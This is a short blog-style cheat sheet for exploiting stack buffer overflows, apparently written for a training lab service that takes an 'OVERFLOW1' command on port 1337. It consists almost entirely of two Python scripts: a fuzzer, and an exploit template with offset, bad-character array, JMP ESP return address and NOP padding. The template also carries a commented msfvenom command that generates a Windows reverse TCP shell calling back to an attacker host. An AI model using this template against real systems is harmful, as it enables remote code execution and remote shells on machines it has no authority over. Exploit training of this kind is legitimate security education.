---
title: BoF Guru
date: "2021-01-09T12:20:10.135Z"
description: Quick and Dirty BOF Documentation.
---

## Exploitation

1. This is not tailored for new beginners, you should already know most of this stuff.
2. This is a quick documentation to help you exploit Buffer overflows quickly.
3. Have fun.

## Scripts

Scripts are documented, read the files and for the Exploit.py file change the `step1/2/3` in the `final_payload`

1. Fuzzer.py

```python
    import sys, socket
from time import sleep

IP = '10.10.10.10'
PORT = 1337
buffer = 'A' * 100
cmd = 'OVERFLOW1' # Space is already included in line 29
while True:
	try:
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect((IP,PORT))
		print('Trying at %s bytes' % str(len(buffer)))
		s.send((cmd + ' ' + buffer + '\r\n'))
		s.close()
		sleep(1)
		buffer = buffer + "A" * 100
	except:
		print('Fuzzing crashed at %s bytes' % str(len(buffer)))
		sys.exit()
```

2. Exploit.py

```python
import sys, socket
from time import sleep

IP = '10.10.10.10'
PORT = 1337

offset = 122 # You get this from the EIP
cmd = "OVERFLOW1"
# buffer
buffer = "A" * offset

# msf-pattern_create -l 500 / msf-pattern_offset -l 500 -q <address>
payload = ""

# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.12 LPORT=53 EXITFUNC=thread -b "\x00" -f py
buf =  b""

# !mona bytearray -b "\x00"
# !mona compare -f bytearray.bin -a <address>
badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

padding = "\x90" * 16

# Return address
# located by running:
# !mona jmp -r esp -cpb "\x00"
ret = "\x12\x65\x52\x56" # 0x56526512

# Steps:
# step 1 ( locate EIP using msf-pattern_create )
step1 = payload
# step 2 (set `offset` & add bad characters ) (repeat this after changing the badchars list to make sure)
step2 = buffer + badchars
# step 3 (after finding the badchars, using mona locate the return address and add your payload)
# You can also change the padding length currently its at 16
step3 =  buffer + ret + padding + buf

final_payload = cmd + step1

try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((IP,PORT))
	print('Sending payload to %s:%s' % (IP,PORT))
	s.send((final_payload+'\r\n'))
	s.close()
	sleep(1)
except:
	print('Failed to connect to %s:%s' % (IP,PORT))
	sys.exit()

```
